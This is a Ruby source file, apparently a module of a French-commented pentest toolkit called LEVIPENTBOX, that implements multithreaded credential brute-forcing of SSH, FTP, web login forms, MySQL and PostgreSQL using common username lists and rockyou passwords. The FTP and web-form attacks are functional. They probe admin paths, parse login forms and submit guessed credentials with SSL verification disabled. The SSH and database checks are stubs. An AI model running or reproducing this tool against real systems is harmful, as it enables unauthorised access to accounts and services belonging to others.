#!/usr/bin/env ruby

# LEVIPENTBOX - Module de Brute Force
# Attaques de brute force avancées

require 'socket'
require 'net/http'
require 'net/https'
require 'uri'
require 'json'
require 'timeout'
require 'thread'
require 'securerandom'

class BruteForce
  attr_reader :results, :credentials
  
  def initialize(target, output_dir)
    @target = target
    @output_dir = output_dir
    @results = {}
    @credentials = []
    @wordlists = {
      users: load_wordlist('/usr/share/wordlists/users.txt'),
      passwords: load_wordlist('/usr/share/wordlists/rockyou.txt')
    }
  end
  
  def log(message, level = 'INFO')
    timestamp = Time.now.strftime('%Y-%m-%d %H:%M:%S')
    puts "[#{timestamp}] [#{level}] #{message}"
  end
  
  def load_wordlist(path)
    if File.exist?(path)
      File.readlines(path).map(&:chomp).reject(&:empty?)
    else
      # Wordlists par défaut si les fichiers n'existent pas
      case path
      when /users/
        ['admin', 'root', 'user', 'administrator', 'guest', 'test', 'demo']
      when /rockyou/
        ['password', '123456', 'admin', 'root', '12345678', 'qwerty', 'letmein']
      else
        []
      end
    end
  end
  
  def brute_force_ssh(port = 22, threads = 5)
    log("🔓 Brute force SSH sur #{@target}:#{port}")
    
    results = []
    queue = Queue.new
    
    # Créer les combinaisons user/password
    @wordlists[:users].each do |user|
      @wordlists[:passwords].each do |password|
        queue << { user: user, password: password }
      end
    end
    
    # Threads de brute force
    thread_pool = []
    threads.times do
      thread_pool << Thread.new do
        while combo = queue.pop(true) rescue nil
          if test_ssh_login(port, combo[:user], combo[:password])
            results << combo
            log("✅ SSH: #{combo[:user]}:#{combo[:password]}")
          end
        end
      end
    end
    
    thread_pool.each(&:join)
    
    @results[:ssh] = {
      port: port,
      success: results.any?,
      credentials: results,
      timestamp: Time.now.iso8601
    }
    
    return @results[:ssh]
  end
  
  def test_ssh_login(port, user, password)
    begin
      Timeout.timeout(5) do
        # Test de connexion SSH basique
        # Note: Ceci est un test simplifié
        socket = TCPSocket.new(@target, port)
        banner = socket.gets.chomp
        
        if banner.include?('SSH')
          # Simulation de test de connexion
          # En réalité, il faudrait utiliser une bibliothèque SSH
          return false
        end
        
        socket.close
        return false
      end
    rescue
      return false
    end
  end
  
  def brute_force_ftp(port = 21, threads = 5)
    log("🔓 Brute force FTP sur #{@target}:#{port}")
    
    results = []
    queue = Queue.new
    
    # Créer les combinaisons user/password
    @wordlists[:users].each do |user|
      @wordlists[:passwords].each do |password|
        queue << { user: user, password: password }
      end
    end
    
    # Threads de brute force
    thread_pool = []
    threads.times do
      thread_pool << Thread.new do
        while combo = queue.pop(true) rescue nil
          if test_ftp_login(port, combo[:user], combo[:password])
            results << combo
            log("✅ FTP: #{combo[:user]}:#{combo[:password]}")
          end
        end
      end
    end
    
    thread_pool.each(&:join)
    
    @results[:ftp] = {
      port: port,
      success: results.any?,
      credentials: results,
      timestamp: Time.now.iso8601
    }
    
    return @results[:ftp]
  end
  
  def test_ftp_login(port, user, password)
    begin
      Timeout.timeout(5) do
        socket = TCPSocket.new(@target, port)
        banner = socket.gets.chomp
        
        if banner.include?('FTP')
          # Envoyer USER
          socket.puts("USER #{user}")
          response = socket.gets.chomp
          
          if response.include?('331')
            # Envoyer PASS
            socket.puts("PASS #{password}")
            response = socket.gets.chomp
            
            if response.include?('230')
              socket.close
              return true
            end
          end
        end
        
        socket.close
        return false
      end
    rescue
      return false
    end
  end
  
  def brute_force_web(port = 80, use_ssl = false, threads = 5)
    log("🔓 Brute force web sur #{@target}:#{port}")
    
    results = []
    protocol = use_ssl ? 'https' : 'http'
    
    # Chemins communs à tester
    common_paths = [
      '/admin', '/login', '/wp-admin', '/phpmyadmin', '/cpanel',
      '/administrator', '/admin.php', '/login.php', '/admin.html',
      '/admin/login', '/admin/admin', '/admin/account',
      '/user', '/users', '/account', '/accounts', '/member',
      '/members', '/moderator', '/webmaster', '/root'
    ]
    
    # Test des chemins
    found_paths = []
    common_paths.each do |path|
      if test_web_path(protocol, port, path)
        found_paths << path
        log("🌐 Chemin trouvé: #{path}")
      end
    end
    
    # Test des formulaires de connexion
    login_forms = []
    found_paths.each do |path|
      forms = find_login_forms(protocol, port, path)
      login_forms.concat(forms)
    end
    
    # Brute force des formulaires
    if login_forms.any?
      login_forms.each do |form|
        result = brute_force_web_form(protocol, port, form, threads)
        results.concat(result) if result.any?
      end
    end
    
    @results[:web] = {
      port: port,
      protocol: protocol,
      success: results.any?,
      paths_found: found_paths,
      login_forms: login_forms,
      credentials: results,
      timestamp: Time.now.iso8601
    }
    
    return @results[:web]
  end
  
  def test_web_path(protocol, port, path)
    begin
      Timeout.timeout(5) do
        uri = URI("#{protocol}://#{@target}:#{port}#{path}")
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = (protocol == 'https')
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        http.open_timeout = 5
        http.read_timeout = 5
        
        response = http.get(path)
        return response.code != '404'
      end
    rescue
      return false
    end
  end
  
  def find_login_forms(protocol, port, path)
    forms = []
    
    begin
      Timeout.timeout(5) do
        uri = URI("#{protocol}://#{@target}:#{port}#{path}")
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = (protocol == 'https')
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        http.open_timeout = 5
        http.read_timeout = 5
        
        response = http.get(path)
        body = response.body
        
        # Chercher les formulaires de connexion
        if body.include?('<form') && (body.include?('password') || body.include?('login'))
          forms << {
            path: path,
            action: extract_form_action(body),
            method: extract_form_method(body),
            fields: extract_form_fields(body)
          }
        end
      end
    rescue => e
      log("Erreur recherche formulaires: #{e.message}", 'WARNING')
    end
    
    return forms
  end
  
  def extract_form_action(body)
    if body =~ /<form[^>]*action=["']([^"']+)["']/
      return $1
    end
    return ''
  end
  
  def extract_form_method(body)
    if body =~ /<form[^>]*method=["']([^"']+)["']/
      return $1.downcase
    end
    return 'post'
  end
  
  def extract_form_fields(body)
    fields = []
    
    # Chercher les champs input
    body.scan(/<input[^>]*name=["']([^"']+)["'][^>]*>/).each do |match|
      fields << match[0]
    end
    
    return fields
  end
  
  def brute_force_web_form(protocol, port, form, threads)
    results = []
    
    # Créer les combinaisons user/password
    combinations = []
    @wordlists[:users].each do |user|
      @wordlists[:passwords].each do |password|
        combinations << { user: user, password: password }
      end
    end
    
    # Test des combinaisons
    combinations.each do |combo|
      if test_web_login(protocol, port, form, combo[:user], combo[:password])
        results << combo
        log("✅ Web: #{combo[:user]}:#{combo[:password]} sur #{form[:path]}")
        break # Arrêter après le premier succès
      end
    end
    
    return results
  end
  
  def test_web_login(protocol, port, form, user, password)
    begin
      Timeout.timeout(5) do
        uri = URI("#{protocol}://#{@target}:#{port}#{form[:action]}")
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = (protocol == 'https')
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        http.open_timeout = 5
        http.read_timeout = 5
        
        # Préparer les données de connexion
        data = {}
        form[:fields].each do |field|
          if field.downcase.include?('user') || field.downcase.include?('login') || field.downcase.include?('email')
            data[field] = user
          elsif field.downcase.include?('pass')
            data[field] = password
          else
            data[field] = 'test'
          end
        end
        
        # Envoyer la requête
        if form[:method] == 'post'
          response = http.post(form[:action], URI.encode_www_form(data))
        else
          uri.query = URI.encode_www_form(data)
          response = http.get(uri.request_uri)
        end
        
        # Vérifier la réponse
        if response.code == '200' && !response.body.include?('error') && !response.body.include?('invalid')
          return true
        end
        
        return false
      end
    rescue => e
      return false
    end
  end
  
  def brute_force_database(port, service, threads = 5)
    log("🔓 Brute force #{service} sur #{@target}:#{port}")
    
    case service.downcase
    when 'mysql'
      return brute_force_mysql(port, threads)
    when 'postgresql'
      return brute_force_postgresql(port, threads)
    else
      log("Service non supporté: #{service}", 'WARNING')
      return nil
    end
  end
  
  def brute_force_mysql(port, threads)
    log("🔓 Brute force MySQL sur #{@target}:#{port}")
    
    results = []
    queue = Queue.new
    
    # Créer les combinaisons user/password
    @wordlists[:users].each do |user|
      @wordlists[:passwords].each do |password|
        queue << { user: user, password: password }
      end
    end
    
    # Threads de brute force
    thread_pool = []
    threads.times do
      thread_pool << Thread.new do
        while combo = queue.pop(true) rescue nil
          if test_mysql_login(port, combo[:user], combo[:password])
            results << combo
            log("✅ MySQL: #{combo[:user]}:#{combo[:password]}")
          end
        end
      end
    end
    
    thread_pool.each(&:join)
    
    @results[:mysql] = {
      port: port,
      success: results.any?,
      credentials: results,
      timestamp: Time.now.iso8601
    }
    
    return @results[:mysql]
  end
  
  def test_mysql_login(port, user, password)
    # Test de connexion MySQL
    # Note: Ceci est un test simplifié
    return false
  end
  
  def brute_force_postgresql(port, threads)
    log("🔓 Brute force PostgreSQL sur #{@target}:#{port}")
    
    results = []
    queue = Queue.new
    
    # Créer les combinaisons user/password
    @wordlists[:users].each do |user|
      @wordlists[:passwords].each do |password|
        queue << { user: user, password: password }
      end
    end
    
    # Threads de brute force
    thread_pool = []
    threads.times do
      thread_pool << Thread.new do
        while combo = queue.pop(true) rescue nil
          if test_postgresql_login(port, combo[:user], combo[:password])
            results << combo
            log("✅ PostgreSQL: #{combo[:user]}:#{combo[:password]}")
          end
        end
      end
    end
    
    thread_pool.each(&:join)
    
    @results[:postgresql] = {
      port: port,
      success: results.any?,
      credentials: results,
      timestamp: Time.now.iso8601
    }
    
    return @results[:postgresql]
  end
  
  def test_postgresql_login(port, user, password)
    # Test de connexion PostgreSQL
    # Note: Ceci est un test simplifié
    return false
  end
  
  def generate_brute_force_report
    log("📊 Génération du rapport de brute force")
    
    report = {
      scan_time: Time.now.iso8601,
      target: @target,
      total_credentials: @results.values.sum { |r| r[:credentials]&.length || 0 },
      results: @results,
      summary: {
        ssh_success: @results[:ssh]&.dig(:success) || false,
        ftp_success: @results[:ftp]&.dig(:success) || false,
        web_success: @results[:web]&.dig(:success) || false,
        mysql_success: @results[:mysql]&.dig(:success) || false,
        postgresql_success: @results[:postgresql]&.dig(:success) || false
      }
    }
    
    report_file = File.join(@output_dir, "brute_force_report.json")
    File.write(report_file, JSON.pretty_generate(report))
    
    log("Rapport de brute force généré: #{report_file}")
    return report_file
  end
end

if __FILE__ == $0
  brute_force = BruteForce.new('192.168.1.1', 'results')
  
  # Test des différents services
  brute_force.brute_force_ssh(22)
  brute_force.brute_force_ftp(21)
  brute_force.brute_force_web(80, false)
  brute_force.brute_force_web(443, true)
  brute_force.brute_force_database(3306, 'MySQL')
  brute_force.brute_force_database(5432, 'PostgreSQL')
  
  # Génération du rapport
  brute_force.generate_brute_force_report
end
